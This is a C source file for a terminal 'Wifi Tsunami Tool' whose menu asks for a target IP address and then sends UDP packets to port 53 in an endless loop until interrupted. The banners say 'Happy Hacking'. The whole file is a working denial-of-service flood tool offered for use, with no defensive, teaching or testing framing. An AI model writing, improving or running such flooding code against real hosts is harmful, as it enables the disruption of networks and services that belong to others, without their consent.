#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>  // For handling signals

int running = 1;  // Variable to control the attack loop

void handle_signal(int signal) {
    printf("\033[1;31m\n[INFO] Flood attack stopped by user.\n");
    
    // Ask user to go to main menu or exit
    char choice;
    printf("\033[1;32mDo you want to go to main menu (m) or exit (e)? ");
    getchar();  // To consume the newline character left by previous input
    scanf("%c", &choice);
    
    if (choice == 'e' || choice == 'E') {
        printf("\033[1;32mExiting... Happy Hacking! 😎\n");
        exit(0);
    } else if (choice == 'm' || choice == 'M') {
        running = 0;  // Stop the current attack
    } else {
        printf("\033[1;31mInvalid choice. Exiting...\n");
        exit(1);
    }
}

void clear_screen() {
    // Clear the screen
    printf("\033[H\033[J");
}

void print_welcome_message() {
    clear_screen();
    printf("\033[1;31m===================================================================================\n");
    printf("\033[1;32m                      Welcome to Wifi Tsunami Tool\n");  // Hacking green color here
    printf("\033[1;31m===================================================================================\n\n");
}

void print_end_message(int packet_count, const char *target_ip) {
    printf("\033[1;32m====================================\n");  // Hacking green color
    printf("Tsunami Attack Completed!\n");
    printf("Sent %d packets to %s\n", packet_count, target_ip);
    printf("\033[1;32m====================================\n");  // Hacking green color
}

void main_menu() {
    int choice;
    
    print_welcome_message();
    printf("\033[1;32mMain Menu:\n");  // Hacking green color
    printf("1. Start UDP Flood\n");
    printf("2. Exit\n");
    printf("\033[1;32mEnter your choice: ");  // Hacking green color
    
    scanf("%d", &choice);
    
    if (choice == 1) {
        char target_ip[100];
        printf("\033[1;32mEnter target IP address: ");  // Hacking green color
        scanf("%s", target_ip);
        
        int sock;
        struct sockaddr_in server;
        char *message = "Flood Packet";
        int packet_count = 0;
        
        // Create socket
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock == -1) {
            printf("\033[1;31mFailed to create socket.\n");
            return;
        }

        // Setup server address
        server.sin_addr.s_addr = inet_addr(target_ip);
        server.sin_family = AF_INET;
        server.sin_port = htons(53);  // DNS port
        
        printf("\033[1;32mStarting UDP flood on %s...\n", target_ip);  // Hacking green color

        // Set up signal handler for Ctrl+C
        signal(SIGINT, handle_signal); // Handle Ctrl+C interrupt

        // Infinite loop to send packets, now controlled by signal
        while (running) {
            if (sendto(sock, message, strlen(message), 0, (struct sockaddr *)&server, sizeof(server)) < 0) {
                printf("\033[1;31mSend failed.\n");
                break;
            }
            packet_count++;
            printf("\033[1;32mPacket %d sent.\n", packet_count);  // Hacking green color
        }

        close(sock);
        print_end_message(packet_count, target_ip);
        main_menu();  // Go back to main menu after flood attack
    } else if (choice == 2) {
        printf("\033[1;32mExiting... Happy Hacking! 😎\n");  // Hacking green color
        exit(0);
    } else {
        printf("\033[1;31mInvalid choice. Please try again.\n");
        main_menu();
    }
}

int main() {
    main_menu();
    return 0;
}

